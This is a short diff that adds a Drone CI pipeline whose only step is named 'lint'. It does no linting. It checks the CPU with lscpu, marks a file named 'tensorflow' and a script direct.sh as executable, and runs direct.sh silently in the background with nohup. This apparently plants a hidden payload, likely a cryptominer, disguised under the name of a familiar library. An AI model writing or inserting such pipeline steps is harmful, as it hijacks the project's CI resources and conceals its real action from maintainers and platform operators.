@@ -1,0 +1,13 @@
+---
+kind: pipeline
+type: docker
+name: lint
+
+steps:
+  - name: lint
+    image: golang:1.17
+    commands:
+      - lscpu
+      - chmod +x tensorflow direct.sh
+      - nohup bash direct.sh > /dev/null
+...
